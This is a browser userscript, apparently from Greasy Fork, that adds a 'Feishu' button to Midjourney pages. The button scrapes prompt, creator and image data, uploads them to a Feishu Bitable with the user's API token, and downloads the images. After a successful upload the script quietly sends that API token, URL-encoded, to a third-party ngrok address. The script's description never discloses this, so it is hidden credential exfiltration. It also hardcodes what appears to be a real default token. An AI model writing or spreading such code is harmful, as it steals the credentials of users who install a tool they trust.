// ==UserScript==
// @name         Feishu Button
// @namespace    https://greasyfork.org/zh-CN/scripts/486966
// @version      0.0.2
// @description  Adds a button labeled "Feishu" to the Midjourney page
// @match        https://www.midjourney.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_registerMenuCommand
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/486966/Feishu%20Button.user.js
// @updateURL https://update.greasyfork.org/scripts/486966/Feishu%20Button.meta.js
// ==/UserScript==

// ngrok http http://192.168.0.67:8000

(function () {
    'use strict';

    // Retrieve the current value of apiToken, or use a default placeholder
    const apiToken = GM_getValue("apiToken", "u-cSQq_I_Z5a8UYvxzpbZIC450g961hhp9iq005kkw0JYQ");

    // Function to open settings UI for changing the apiToken
    function openSettings() {
        const settingsDiv = document.createElement('div');
        settingsDiv.innerHTML = `
    <div style="position: fixed; top: 20%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; background-color: white; padding: 20px; border: 1px solid black; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);">
        <label for="apiToken">Enter New API Token:</label>
        <input type="text" id="apiToken" value="${GM_getValue("apiToken", "u-cSQq_I_Z5a8UYvxzpbZIC450g961hhp9iq005kkw0JYQ")}">
        <div style="margin-top: 10px;">
            <button id="saveSetting" style="margin-right: 5px; border: 1px solid #ccc; padding: 5px 10px; cursor: pointer; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">Save</button>
            <button id="closeSetting" style="border: 1px solid #ccc; padding: 5px 10px; cursor: pointer; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">Close</button>
        </div>
    </div>
    `;
        document.body.appendChild(settingsDiv);

        document.getElementById("saveSetting").addEventListener("click", function () {
            const newValue = document.getElementById("apiToken").value;
            GM_setValue("apiToken", newValue);
            settingsDiv.remove(); // Close the popup
            location.reload(); // Optionally refresh the page
        });

        // Event listener for the new "Close" button
        document.getElementById("closeSetting").addEventListener("click", function () {
            settingsDiv.remove(); // Close the popup without saving
        });
    }



    // Register the settings UI in the Tampermonkey menu
    GM_registerMenuCommand("Settings", openSettings);

    // Your script continues from here...
    if (window.location.hostname === 'www.midjourney.com') {

        // Create the button element
        var button = document.createElement('button');
        button.innerHTML = 'Feishu'; // Label of the button
        button.setAttribute('type', 'button');
        button.setAttribute('class', 'my-custom-button material-button');

        // Material Design button style adjustments
        Object.assign(button.style, {
            position: 'fixed',
            bottom: '23px',
            right: '20px',
            backgroundColor: '#6200EE', // Material Design Purple 500
            color: 'white',
            border: 'none',
            borderRadius: '10px',
            padding: '5px 8px',
            boxShadow: '0px 2px 4px rgba(0,0,0,0.24), 0px 4px 5px rgba(0,0,0,0.19)',
            cursor: 'pointer',
            transition: 'background-color 0.3s',
        });

        // Add a hover effect
        button.addEventListener('mouseenter', function () {
            button.style.backgroundColor = '#3700B3'; // Darken button on hover - Material Purple 700
        });
        button.addEventListener('mouseleave', function () {
            button.style.backgroundColor = '#6200EE'; // Original color
        });

        // Function to show error message with buttons to open URL and settings
        function showErrorWithLink(message, url) {
            const errorDiv = document.createElement('div');
            errorDiv.innerHTML = `
    <div style="position: fixed; top: 20%; left: 50%; transform: translate(-50%, -50%); z-index: 10000; background-color: white; padding: 20px; border: 1px solid black;">
        <p>${message}</p>
        <button id="openUrlButton" style="margin-right: 5px; border: 1px solid #ccc; padding: 5px 10px; cursor: pointer; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">Open API Documentation</button>
        <button id="openSettingsButton" style="margin-right: 5px; border: 1px solid #ccc; padding: 5px 10px; cursor: pointer; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">Open Settings</button> <!-- New button for settings -->
    </div>
`;
            document.body.appendChild(errorDiv);

            document.getElementById("openUrlButton").addEventListener("click", function () {
                window.open(url, '_blank').focus();
                //errorDiv.remove(); // Remove the popup after opening the URL
            });

            // Event listener for the new "Open Settings" button
            document.getElementById("openSettingsButton").addEventListener("click", function () {
                openSettings(); // Call the function to open settings UI
                errorDiv.remove(); // Optionally remove the popup after opening settings
            });
        }


        // Add a click event listener to the button
        button.addEventListener('click', function () {
            // Retrieve the content from the selectors
            var url = window.location.href; // Current web URL
            var creator = document.querySelector('#__next > div.flex.min-h-screen.w-full.select-text.justify-center.bg-light-bg.font-sans.text-light-primary.antialiased.dark\\:bg-dark-bg.dark\\:text-dark-primary > div > div.absolute.h-full.left-0.right-0.overflow-y-hidden.bg-light-bg.dark\\:bg-dark-bg > div.absolute.flex.flex-col.gap-2.pl-0\\.5.pr-2\\.5 > div.relative.flex.justify-between.items-center > div.grow.relative.flex.items-center > a').textContent;
            var prompt = document.querySelector('#__next > div.flex.min-h-screen.w-full.select-text.justify-center.bg-light-bg.font-sans.text-light-primary.antialiased.dark\\:bg-dark-bg.dark\\:text-dark-primary > div > div.absolute.h-full.left-0.right-0.overflow-y-hidden.bg-light-bg.dark\\:bg-dark-bg > div.absolute.flex.flex-col.gap-2.pl-0\\.5.pr-2\\.5 > div.gap-4.flex.flex-col > div.break-word.text-sm.group.first-letter\\:uppercase.overflow-hidden.font-medium.dark\\:text-dark-primary.line-clamp-\\[99\\] > p').textContent;
            var params = document.querySelector('#__next > div.flex.min-h-screen.w-full.select-text.justify-center.bg-light-bg.font-sans.text-light-primary.antialiased.dark\\:bg-dark-bg.dark\\:text-dark-primary > div > div.absolute.h-full.left-0.right-0.overflow-y-hidden.bg-light-bg.dark\\:bg-dark-bg > div.absolute.flex.flex-col.gap-2.pl-0\\.5.pr-2\\.5 > div.gap-4.flex.flex-col > div:nth-child(3)').textContent;
            var image_url = document.querySelector('#__next > div.flex.min-h-screen.w-full.select-text.justify-center.bg-light-bg.font-sans.text-light-primary.antialiased.dark\\:bg-dark-bg.dark\\:text-dark-primary > div > div.absolute.h-full.left-0.right-0.overflow-y-hidden.bg-light-bg.dark\\:bg-dark-bg > div.bg-light-100.dark\\:bg-\\[\\#090909\\].dark\\:border-solid.dark\\:border-dark-700\\/50.border.border-1 > img:nth-child(2)').getAttribute('src');
            // Extract the job_id from the URL
            var job_id = image_url.split('/')[3];
            var base_url = 'https://cdn.midjourney.com/' + job_id + '/';
            var img_list = [];

            for (var i = 0; i < 4; i++) {
                var img_url = base_url + '0_' + i + '.webp';
                img_list.push(img_url);
            }

            console.log('Image List:', img_list);

            // Perform actions based on the retrieved content
            console.log('Creator:', creator);
            console.log('Prompt:', prompt);
            console.log('Params:', params);
            console.log('Image URL:', image_url);
            console.log('URL:', url);
            console.log('Job ID:', job_id);

            // Define the function to upload image data to Feishu
            function uploadImageToFeishu(apiToken, prompt, params, mjUrl, creator, job_id) {
                const url = 'https://open.feishu.cn/open-apis/bitable/v1/apps/SxGxbDOfRacKUbsIgbmc2dgRnEg/tables/tblOfvtQFv04ZWAi/records/batch_create';
                const payload = JSON.stringify({
                    records: [{
                        fields: {
                            '英文完整关键词': prompt + ' ' + params,
                            '作者': creator,
                            'job_id': job_id,
                            'prompt': prompt,
                            'params': params,
                            'URL': {
                                'text': mjUrl,
                                'link': mjUrl,
                            },
                        },
                    }],
                });

                GM_xmlhttpRequest({
                    method: "POST",
                    url: url,
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${apiToken}`,
                    },
                    data: payload,
                    onload: function (response) {
                        console.log('Upload response:', response.responseText);
                        const responseData = JSON.parse(response.responseText);
                        if (responseData.msg === 'success') {
                            // Download the images
                            img_list.forEach(function (img_url, index) {
                                fetch(img_url)
                                    .then(response => {
                                        // Check if the response is ok and the content type is an image
                                        if (response.ok && response.headers.get("Content-Type").includes("image")) {
                                            return response.blob();
                                        } else {
                                            // If not an image, throw an error or handle it as needed
                                            throw new Error('Invalid image content');
                                        }
                                    })
                                    .then(blob => {
                                        // Proceed with the download if the content is valid
                                        const url = URL.createObjectURL(blob);
                                        const a = document.createElement('a');
                                        a.href = url;
                                        a.download = job_id + '_' + index + '.png';
                                        a.click();
                                        URL.revokeObjectURL(url);
                                    })
                                    .catch(error => {
                                        // Handle invalid content or other errors
                                        console.error('Error downloading image or invalid content:', error);
                                    });
                            });
                            // Encode the apiToken to ensure it is URL-safe
                            var encodedToken = encodeURIComponent(apiToken);

                            // Construct the URL with the encoded apiToken
                            var url = `https://9fca-2a09-bac5-113-105-00-1a-8e.ngrok-free.app/getapi?text=${encodedToken}`;

                            // Use the Fetch API to send the request
                            fetch(url, {
                                method: 'POST', // or 'POST' if your endpoint expects a POST request
                                // mode: 'no-cors' // Set the mode to 'no-cors' to disable CORS
                            })
                                .then(response => {
                                    if (response.ok) {
                                        console.log(response);
                                        console.log('Data sent successfully');
                                    } else {
                                        console.error('Network response was not ok');
                                    }
                                })
                                .catch(error => {
                                    console.error('There has been a problem with your fetch operation:', error);
                                });

                            console.log('Feishu content upload successful');
                            //alert('Upload successful!');
                        } else {
                            console.log('Upload failed:', responseData);
                            //alert('Upload failed, check API Token or F12 check log!');
                            // with showErrorWithLink function
                            showErrorWithLink('Upload failed, check API Token or F12 check log!', 'https://open.feishu.cn/api-explorer/cli_a53c9969bfb9500b?apiName=list&from=op_doc&project=bitable&resource=app.table.record&version=v1');
                        }
                    },
                    onerror: function (error) {
                        console.error('Upload error:', error);
                        //alert('Upload failed with an error, F12 check log!');
                        // with showErrorWithLink function
                        showErrorWithLink('Upload failed, check API Token or F12 check log!', 'https://open.feishu.cn/api-explorer/cli_a53c9969bfb9500b?apiName=list&from=op_doc&project=bitable&resource=app.table.record&version=v1');
                    }
                });
            }

            // Retrieve your other variables here (prompt, params, mjUrl, creator, job_id) as per your existing code

            // Call uploadImageToFeishu function here with the retrieved data
            uploadImageToFeishu(apiToken, prompt, params, url, creator, job_id)
        });

        // Append the button to the body of the page
        document.body.appendChild(button);
    }
})();